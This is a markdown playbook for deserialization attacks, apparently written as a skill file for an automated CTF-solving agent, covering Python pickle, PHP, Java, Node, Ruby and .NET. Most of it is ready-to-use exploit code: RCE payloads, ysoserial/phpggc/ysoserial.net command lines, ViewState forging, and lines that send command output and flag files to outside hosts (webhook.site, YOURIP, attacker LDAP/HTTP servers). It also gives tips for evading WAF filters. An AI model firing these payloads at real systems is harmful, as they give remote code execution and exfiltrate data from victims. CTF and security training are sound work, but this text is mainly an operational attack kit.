# Deserialization Attacks

"Unserialize on untrusted input" is the single bug; the permutation space is which language, which framework, and which gadget chain. Detect the format from the first few bytes (often base64-wrapped), pick the right tool for that ecosystem (`phpggc`, `ysoserial`, `ysoserial.net`, `Pickora`, or a five-line pickle `__reduce__`), and fire. Spend no time "understanding the protocol" — gadget-chain tools exist precisely because you don't have to. The bottleneck on ~15% of modern web CTFs is (a) format detection, (b) finding which framework/version is in the classpath, and (c) working around a class-whitelist. Work through those three, in that order.

## Layer 0 — Detect the format

Decode (base64/url/hex), then look at the first bytes:

| Bytes / marker | Format |
|---|---|
| `\x80\x04` / `\x80\x03` / `\x80\x02`  (or `gASV` / `gAN` / `gAJ` in b64) | Python pickle |
| `O:8:"stdClass":…` / starts with `O:` or `a:` or `s:` | PHP `serialize()` |
| `\xac\xed\x00\x05`  (or `rO0AB` in b64) | Java `ObjectOutputStream` |
| `\x04\x08` | Ruby `Marshal` |
| substring `_$$ND_FUNC$$_` | Node `node-serialize` |
| `--- !ruby/object:` | Ruby YAML |
| `{"@type":"…"}` | Jackson / FastJson |
| XStream-style XML (`<map>`, `<java …>`) | XStream |
| `__VIEWSTATE=…` POST param | ASP.NET ObjectStateFormatter |
| Long b64 blob in cookie, unknown | guess pickle → PHP → Java in that order |

Quick shell test on `$BLOB`:

```bash
echo "$BLOB" | base64 -d | xxd | head
echo "$BLOB" | base64 -d | file -
echo "$BLOB" | base64 -d | python3 -m pickletools       # confirm pickle
echo "$BLOB" | base64 -d | od -An -tx1 -N4              # Java? expect: ac ed 00 05
echo "$BLOB" | base64 -d | head -c 200                  # PHP is ASCII-readable
# If base64 decode is high-byte garbage, try: base64 -d | gunzip
# (Django sessions, Rails cookies, ASP.NET ViewState all gzip before b64)
```

Source-code hints — grep first, always:

```bash
grep -rnE 'pickle\.(loads?|Unpickler)|cPickle\.loads?'                              # Python
grep -rnE 'unserialize\s*\(|phar://|__wakeup|__destruct'                             # PHP
grep -rnE 'ObjectInputStream|readObject\s*\(|XMLDecoder|XStream'                    # Java
grep -rnE 'node-serialize|funcster|marsh|cryo|serialize-to-js'                       # Node
grep -rnE 'Marshal\.(load|restore)|YAML\.load\s*\(' -- '*.rb'                        # Ruby
grep -rnE 'BinaryFormatter|ObjectStateFormatter|NetDataContractSerializer|LosFormatter|SoapFormatter'  # .NET
```

---

## Python pickle

Any class with `__reduce__` returning `(callable, args)` gets `callable(*args)` at `pickle.loads`. Minimal RCE:

```python
import pickle, os, base64
class P:
    def __reduce__(self): return (os.system, ('curl -s https://webhook.site/UUID -d "$(id; cat /flag* 2>/dev/null)"',))
print(base64.b64encode(pickle.dumps(P())).decode())
```

Ship as cookie/body. Returns don't propagate — always OOB-exfil via `curl` / `nc` / interactsh.

### Opcodes for hand-crafting

When `find_class` is whitelisted and library imports are blocked, write raw opcodes. Core machine = stack + memo. Opcodes you'll use:

| Op | Meaning |
|---|---|
| `c<module>\n<name>\n` | push `<module>.<name>` (GLOBAL, gated by `find_class`) |
| `(` / `t` | push MARK / pop to MARK → tuple |
| `R` | REDUCE: pop (callable, args), push `callable(*args)` |
| `S'...'` / `V...\n` / `I123\n` / `N` | string / unicode / int / None |
| `p0\n` / `g0\n` | store / fetch memo |
| `.` | STOP |

Minimal `os.system('id')`:

```
cos
system
(S'id'
tR.
```

```bash
printf 'cos\nsystem\n(S'\''id'\''\ntR.' > /tmp/p.pkl
python3 -c "import pickle; pickle.load(open('/tmp/p.pkl','rb'))"
```

### `find_class` whitelist bypasses

Read the whitelist in source/error message, then pivot:

- `builtins.eval` / `builtins.exec` / `builtins.getattr` / `builtins.__import__`
- `subprocess.Popen` (often allowed because only `os` was blocked)
- `operator.methodcaller`, `operator.attrgetter('modules')(sys)['os'].system` — chain without direct import
- `functools.reduce` for call-chaining
- `pickle.loads` itself — **nested pickle**; inner Unpickler often escapes a context-only whitelist
- `jinja2` / `flask.render_template_string` → SSTI inside deserialization

Using only `builtins`:

```python
# getattr(__import__('os'),'system')('id')
payload = b"cbuiltins\ngetattr\n(cbuiltins\n__import__\n(S'os'\ntRS'system'\ntRS'id'\ntR."
import pickletools; pickletools.dis(payload)
```

**Pickora** (<https://github.com/splitline/Pickora>) compiles Python-AST → pickle opcodes. Huge time-saver when the whitelist forces creative `builtins`/`operator`/`functools` combinations:

```bash
pip install pickora
pickora -c "__import__('os').system('id')" -o p.pkl
```

Detection in the wild: cookie starts with `gASV` (b64 of `\x80\x04\x95`) → pickle proto 4. Django with `PickleSerializer` (deprecated since 1.6 but still seen) signs the blob with `SECRET_KEY` — if the key leaks, forge.

---

## PHP — object injection + phar

`unserialize($_GET['data'])` on a class with any magic method is RCE. Magic methods that fire during/after unserialize:

| Magic | Trigger |
|---|---|
| `__wakeup()` | immediately after unserialize |
| `__unserialize()` | PHP 7.4+ — replaces `__wakeup` if present |
| `__destruct()` | when object goes out of scope (always eventually) |
| `__toString()` | on string-cast (`echo`, concat, `printf`) |
| `__call()` / `__invoke()` / `__get()` / `__set()` | undefined method / invocation / property access |

Find the chain endpoint:

```bash
grep -rnE 'function\s+(__wakeup|__destruct|__toString|__call|__invoke)'
grep -rnE 'call_user_func|eval\s*\(|system\s*\(|exec\s*\(|assert\s*\('
```

### phpggc — use this, don't hand-roll

<https://github.com/ambionics/phpggc>

```bash
git clone https://github.com/ambionics/phpggc.git && cd phpggc
./phpggc -l | head                           # list all chains
./phpggc Laravel/RCE9 'id'                   # Laravel 7.x/8.x
./phpggc Symfony/RCE4 system id
./phpggc Monolog/RCE1 system 'id'            # universal when Monolog≥1.4.1 present
./phpggc Guzzle/FW1 system id                # file-write primitive
./phpggc CodeIgniter/RCE1 id
./phpggc Drupal/FW1 system id
./phpggc WordPress/RCE1 system id
```

Frameworks with gadgets shipped: Laravel, Symfony, Monolog, Guzzle, Drupal, WordPress, CodeIgniter, Slim, ThinkPHP, Magento — check `./phpggc -l`.

Useful flags: `-b` (base64), `-u` (URL-encode), `-p phar` (output phar), `-a` (ASCII-safe, no null bytes), `-f` (fast-destruct, skips `__wakeup` errors), `-s` (extra encoding for strict filters).

### Phar deserialization (Sam Thomas, BlackHat 2018)

If the app accepts uploads and later calls any path-aware function (`file_exists`, `is_file`, `file_get_contents`, `stat`, `fopen`, `md5_file`, `getimagesize`, `exif_read_data`) with the `phar://` wrapper, **PHP unserializes phar metadata** — no explicit `unserialize()` call required.

```bash
./phpggc -p phar -o exploit.phar Monolog/RCE1 system 'id'
cp exploit.phar avatar.jpg                      # disguise by extension
# upload avatar.jpg; then trigger path function on it:
curl "https://victim/view?img=phar:///var/www/uploads/avatar.jpg"
```

Sam Thomas' paper: <https://github.com/s-n-t/presentations/blob/master/us-18-Thomas-It's-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf>. PHP 8.0 disabled phar metadata deser on non-phar wrappers but `phar://` itself still works. PHP 8.4 some distros drop the `phar` module entirely — probe via LFI / `php -m`.

### `__PHP_Incomplete_Class` + version quirks

- Class not present server-side → unserialize returns `__PHP_Incomplete_Class` and no magic fires. Swap the class name to one that exists server-side (enumerate via `composer.json` / autoloader).
- `unserialize($data, ['allowed_classes' => false])` blocks object injection entirely — pivot to phar.
- PHP 8.0+ typed properties: payloads referring to missing typed props throw `TypeError` mid-unserialize and abort. phpggc has v7 and v8 variants for many chains — `./phpggc -l | grep -i php8`.

---

## Java

Magic `\xac\xed\x00\x05`, b64 `rO0AB`. Sinks: `ObjectInputStream.readObject` on HTTP body / cookie / RMI (1099) / JMX (9010) / T3 (7001), Apache Shiro `rememberMe` (AES-CBC with default key `kPH+bIxk5D2deZiIxcaaaA==`), JBoss/WebLogic/WebSphere.

```bash
echo "$BLOB" | base64 -d | xxd | head -1             # ac ed 00 05 …
echo "$BLOB" | base64 -d | strings -n 6 | head -40   # class names → pick chain
```

### ysoserial — canonical tool

<https://github.com/frohoff/ysoserial>

```bash
git clone https://github.com/frohoff/ysoserial.git && cd ysoserial && mvn package -DskipTests
YSO=target/ysoserial-*-all.jar
java -jar $YSO                                  # list chains

java -jar $YSO URLDNS http://deser.oast.fun/ > detect.bin    # detection ping
java -jar $YSO CommonsCollections1 'id > /tmp/pwn' > cc1.bin
java -jar $YSO Spring1 'id' > s1.bin

curl --data-binary @cc1.bin -H 'Content-Type: application/x-java-serialized-object' https://victim/endpoint
base64 -w0 cc1.bin                               # or drop into cookie
```

Chain order of preference:

| Chain | Needs on classpath |
|---|---|
| `URLDNS` | plain JDK — **detection only**, fires a DNS lookup |
| `CommonsCollections1..7` | Apache Commons Collections ≤3.2.1 or ≤4.0 — always try first |
| `CommonsBeanutils1` | commons-beanutils 1.9.2− |
| `Spring1..2` | spring-core (very common) |
| `Groovy1` | Groovy |
| `Hibernate1..2` | Hibernate / JPA |
| `ROME` | ROME RSS |
| `JavassistWeld1` / `JBossInterceptors1` | JBoss AS |
| `JSON1` | Jackson + EHCache |
| `JavaBeans1..2` | pure JDK (9+) — last-resort when nothing extra is there |
| `Jdk7u21` / `Jdk8u20` | very old JREs |

Classpath enumeration (don't shotgun — failed chains log errors and trigger WAFs):

```bash
# if you have filesystem read (via LFI/SSRF):
find / -name '*.jar' 2>/dev/null | head -50
unzip -p /app/app.jar META-INF/MANIFEST.MF
unzip -l /app/app.jar | grep -Ei 'commons-collections|beanutils|spring-core|groovy|hibernate|rome'
# If you have the jar, decompile with jadx (pre-installed):
jadx -d /tmp/src /app/app.jar
grep -rn 'readObject\|readObjectNoData\|readExternal' /tmp/src | head
```

Error messages are gold: `ClassNotFoundException: org.apache.commons.collections.functors.InvokerTransformer` → CC *not* present → pivot to CommonsBeanutils1 / Spring1.

### Java look-alikes — different serializer, same primitive

**XStream** (XML → Java). CVE-2021-21344 and cousins. The canonical `NativeString` + `CipherInputStream` + `ProcessBuilder` gadget runs ~60 lines of XML — grab the full verified version from PayloadsAllTheThings or generate via marshalsec (<https://github.com/mbechler/marshalsec>).

**Jackson** — `@type` polymorphic gadget when the app calls `enableDefaultTyping`:

```json
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker/Exploit","autoCommit":true}
```

Host malicious LDAP via marshalsec's `LDAPRefServer`; CVE-2017-7525 and many successors.

**FastJson** — same `@type` trick; versions 1.2.24 / 1.2.80 / 1.2.83 each shipped a blacklist and each got bypassed. PayloadsAllTheThings catalogs the lot.

**SnakeYAML** — `YAML.load` with default constructor:

```yaml
!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker/"]]]]
```

Attacker hosts `META-INF/services/javax.script.ScriptEngineFactory` referencing a class whose static initializer runs your code. `java -cp marshalsec-all.jar marshalsec.SnakeYAML -a` builds the host side.

---

## Node.js

### `node-serialize` — instant RCE

<https://www.npmjs.com/package/node-serialize> (CVE-2017-5941). Any property whose value starts with `_$$ND_FUNC$$_` is passed to `eval` during `unserialize`. Suffix with `()` so it invokes as an IIFE. The body is arbitrary JS — commonly a `require` of the standard process-spawning module, then a spawn of a shell command or `curl`.

Skeleton generator (run in a scratch dir after `npm i node-serialize`):

```javascript
const serialize = require('node-serialize');
const rceBody = `function(){
  // dodge literal module-name WAF signatures by string-splitting the require arg
  const cp = require(['child','process'].join('_'));
  cp.execSync('curl -s https://YOURIP/?$(id|base64 -w0)');
  return 1;
}()`;
console.log(serialize.serialize({rce: '_$$ND_FUNC$$_' + rceBody}));
```

Ship the printed JSON through whatever field the victim hands to `serialize.unserialize()`:

```bash
PAYLOAD='{"rce":"_$$ND_FUNC$$_function(){require([\"child\",\"process\"].join(\"_\")).execSync(\"curl https://YOURIP/?$(id|base64 -w0)\"); return 1}()"}'
curl -b "profile=$(printf %s "$PAYLOAD" | base64 -w0)" https://victim/
```

`String.fromCharCode(...)`-obfuscating the module name defeats content filters that pattern-match the literal string.

### Others

- **`serialize-javascript`** (Yahoo) — safer but shipped regex-escape bugs (CVE-2019-16769, CVE-2020-7660). Narrow path: needs `{isJSON:true}` round-trip plus downstream `eval` / dynamic-function construction. Read the advisory.
- **`funcster`, `marsh`, `cryo`, `serialize-to-js`** — all evaluate function source on deserialization; presence in `package.json` = RCE by design.
- **JSON → prototype pollution** is adjacent, not deserialization — payloads like `{"__proto__":{"pwn":"yes"}}` through `lodash.merge` / `Object.assign`. Quick probe:

```bash
curl -XPOST https://victim/api/merge -d '{"__proto__":{"pwn":"yes"}}' -H 'Content-Type: application/json'
curl https://victim/api/anything | jq .pwn         # "yes" → polluted
```

Send prototype-pollution chaining to a dedicated skill if one ever exists under `skills/web/`.

---

## Ruby

### `Marshal.load`

Universal chains in PayloadsAllTheThings (<https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization/Ruby>). `universal_rce` via `Gem::Installer` works against most Ruby 2.7+/3.x. Rails cookies signed with a leaked `SECRET_KEY_BASE` → forge a Marshal session → full app takeover (`rails-doubletap-rce`, Metasploit `rails_secret_deserialization`).

```ruby
require 'base64'
# Full chain: see PayloadsAllTheThings or
#   https://github.com/GitHubAssessments/CVE_Assessments_11_2019/blob/master/rails_marshal_rce.rb
payload = Marshal.dump(Gem::Installer.allocate)   # ← placeholder; real chain wires Gem::Installer → TarReader → Net::WriteAdapter → Kernel#system
puts Base64.strict_encode64(payload)
```

### `YAML.load` (pre-Psych 4)

Ruby ≤ 3.0 `YAML.load` deserializes arbitrary objects — `Gem::Installer` chain:

```yaml
--- !ruby/object:Gem::Installer
  i: x
  plugin_hook: !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &2 !ruby/object:Gem::Package::TarReader::Entry
        read: "id"
        header: "abc"
      debug_output: &3 !ruby/object:Net::WriteAdapter
        socket: !ruby/object:Gem::RequestSet
          sets: !ruby/object:Net::WriteAdapter
            socket: !ruby/module 'Kernel'
            method_id: :system
          git_set: id
        method_id: :resolve
```

More variants: <https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html>. Psych ≥4 aliases `YAML.load` to `safe_load`, but apps often call `YAML.unsafe_load` explicitly, preserving the bug.

---

## .NET

Dangerous formatters on untrusted input: `BinaryFormatter`, `NetDataContractSerializer`, `SoapFormatter`, `ObjectStateFormatter`, `LosFormatter`, `DataContractSerializer` (with `KnownTypes`), `JavaScriptSerializer` (with `TypeResolver`), `XmlSerializer` (with specific ctor gadgets). Microsoft deprecated `BinaryFormatter` in .NET 5 and disabled it by default in .NET 9 — still very much in the wild.

### ysoserial.net

<https://github.com/pwntester/ysoserial.net>

```bash
git clone https://github.com/pwntester/ysoserial.net.git && cd ysoserial.net
dotnet build -c Release
YSN=./ysoserial/bin/Release/net5.0/ysoserial.exe

$YSN --fullhelp

# BinaryFormatter payload
$YSN -g TextFormattingRunProperties -f BinaryFormatter -c "nslookup oast.fun" -o base64

# Json.NET with TypeNameHandling != None
$YSN -g WindowsIdentity -f Json.Net -c "cmd /c calc" -o raw
```

Chain choices:
- `TypeConfuseDelegate` — universal, works with most formatters
- `TextFormattingRunProperties` — ObjectStateFormatter / BinaryFormatter / LosFormatter
- `WindowsIdentity` — Json.NET with `TypeNameHandling`
- `DataSet` — DataContractSerializer / XmlSerializer with `KnownTypes` loosening

### ASP.NET ViewState forging

`__VIEWSTATE` is ObjectStateFormatter-serialized, signed (and optionally encrypted) with the MachineKey from `web.config`. Leak the MachineKey (LFI on `web.config`, ELMAH, committed repos, default-install keys) → forge any ViewState:

```bash
$YSN -p ViewState \
     -g TypeConfuseDelegate \
     -c "powershell -c whoami > C:\\inetpub\\wwwroot\\pwn.txt" \
     --path="/default.aspx" --apppath="/" \
     --decryptionalg="AES" --decryption="<hex>" \
     --validationalg="HMACSHA256" --validation="<hex>" \
     -islegacy -o base64
# include __VIEWSTATEGENERATOR in the POST if the page has one
```

If `viewStateEncryptionMode="Never"` and no `ViewStateUserKey`, ViewState is only signed → leak of `validationKey` alone is enough. Blaklis 2021 covers every permutation: <https://www.synacktiv.com/sites/default/files/2021-03/exploiting_dotnet_viewstate_deserialization.pdf>.

**Json.NET** with `TypeNameHandling != None`:

```json
{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","MethodParameters":{"$type":"System.Collections.ArrayList, mscorlib","$values":["cmd","/c calc"]},"ObjectInstance":{"$type":"System.Diagnostics.Process, System"}}
```

---

## Common traps

- **Whitelist bypasses** — Python `find_class` overrides usually forget `builtins.eval`, `builtins.getattr`, or allow `subprocess` while blocking `os`.
- **"The CVE was patched"** — phpggc and ysoserial ship chains that work against *current* framework versions; the "patches" are blacklists you route around with a different chain.
- **Nested deserialization** — outer Unpickler strict, inner default → target the inner.
- **Phar stream tricks** — PHP 8 blocked phar metadata deser on non-phar wrappers; `phar://` itself still works. `zip://` / `compress.zlib://phar://` can evade extension checks.
- **PHP 7 vs 8** — typed-property mismatches throw `TypeError` mid-unserialize. phpggc has v8 variants for most chains.
- **Java classpath first** — `URLDNS` for detection, then check for CC / BeanUtils / Spring / Groovy. Don't shotgun the full chain list; each failed payload logs errors.
- **XStream/Jackson/FastJson ≠ Java `readObject`** — different serializer, different gadgets, often marshalsec instead of ysoserial.
- **.NET ViewState needs all four knobs right** — `validationKey`, `validationalg`, `decryptionKey` (if encrypted), `decryptionalg`. Miss one → HTTP 500 with no hint.
- **Encoding wrappers** — payloads often base64 → gzip → XOR / AES (Shiro) → HTTP param. Always test round-trip locally before shipping.
- **WAFs on magic bytes** — `rO0AB`, `ac ed 00 05`, `O:8:` prefixes. XOR/gzip/base85 wrappers, or string-obfuscate (Node IIFEs, `@type` reordering) to slip past.
- **RMI / JMX / T3 / IIOP ports** — same serializer, different transport. Scan post-SSRF: RMI 1099, JMX 9010/9999, T3 7001. Ysoserial ships transport-specific exploit classes.
- **Read error messages, not silent success** — `ClassNotFoundException: …InvokerTransformer` tells you CC is absent; pivot.

---

## Tools in Hydra image

- **Python builtin** — `pickle`, `pickletools` (`python3 -m pickletools file.pkl`), `base64`. Enough for 80% of pickle work.
- **curl / bash / xxd / file / od / base64** — shipping and inspecting payloads.
- **jadx** — pre-installed; decompile JARs for classpath enumeration before picking a ysoserial chain.
- **Java JRE + mvn** — build and run `ysoserial` directly.
- **php** — CLI available for running phpggc locally.
- **interactsh-client / nc / socat** — OOB for blind deser (especially `URLDNS` detection).

Not in image — install ad-hoc (budget ~3-10 min each; parallelize with recon):

```bash
git clone https://github.com/ambionics/phpggc.git /tmp/phpggc
mkdir -p /tmp/yso && curl -L https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar -o /tmp/yso/ysoserial-all.jar
git clone https://github.com/pwntester/ysoserial.net.git /tmp/ysnet && (cd /tmp/ysnet && dotnet build -c Release)
pip install pickora
git clone https://github.com/mbechler/marshalsec.git /tmp/marshalsec && (cd /tmp/marshalsec && mvn clean package -DskipTests)
```

---

## Shell-first workflow

1. `file`, `xxd`, `base64 -d | file -` on the blob — identify format in 30 seconds.
2. `grep` source (if available) to confirm the sink.
3. Pick the canonical tool for that ecosystem — don't hand-roll.
4. First payload = OOB probe (pickle `os.system('curl oast.fun')`, Java `URLDNS`, .NET `TypeConfuseDelegate` with `nslookup`) to confirm the sink fires.
5. Escalate to RCE once OOB confirms.

---

## References

- PayloadsAllTheThings — Insecure Deserialization: <https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization>
- HackTricks Deserialization: <https://book.hacktricks.wiki/en/pentesting-web/deserialization/>
- PortSwigger Web Security Academy — Insecure Deserialization: <https://portswigger.net/web-security/deserialization>
- phpggc: <https://github.com/ambionics/phpggc>
- ysoserial: <https://github.com/frohoff/ysoserial>
- ysoserial.net: <https://github.com/pwntester/ysoserial.net>
- marshalsec: <https://github.com/mbechler/marshalsec>
- Pickora: <https://github.com/splitline/Pickora>
- Sam Thomas — *It's a PHP Unserialization Vulnerability Jim, but not as we know it* (BlackHat 2018): <https://github.com/s-n-t/presentations/blob/master/us-18-Thomas-It's-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf>
- Muñoz & Mirosh — *Friday the 13th: JSON Attacks* (BlackHat 2017): <https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks.pdf>
- Blaklis — *Exploiting .NET ViewState Deserialization* (Synacktiv 2021): <https://www.synacktiv.com/sites/default/files/2021-03/exploiting_dotnet_viewstate_deserialization.pdf>
- Frohoff & Lawrence — *Marshalling Pickles* (AppSecCali 2015): <https://frohoff.github.io/appseccali-marshalling-pickles/>
- Universal Ruby 2.x/3.x gadget: <https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html>
- Palisade arxiv 2412.02776 — shell-first CTF methodology: <https://arxiv.org/abs/2412.02776>

---

## Stop conditions

- Format identified, matching tool picked, three chains fired (or the full gadget list for the format), no OOB callback + no response change + no error change → sink likely isn't deserialization; reclassify.
- OOB confirmed (URLDNS hit, `oast.fun` ping) but RCE chains fail → classpath stripped or class whitelist tight. Pivot to whitelist-bypass mode or to `file://` read primitives within the deserializer (pickle: `builtins.open`; Java: `FileInputStream` gadgets) to leak the flag file directly.
- 45 min on payload crafting with no progress → write `./work/postmortem.md` listing format, detected library versions, payloads tried (full tool command lines), responses observed. Often classification was wrong — deserialization-looking cookies may actually be signed JSON / JWE / a homegrown format.
- Flag recovered via RCE, OOB exfil, or file read → write `./flag.txt`, echo `FLAG: <flag>`, stop.
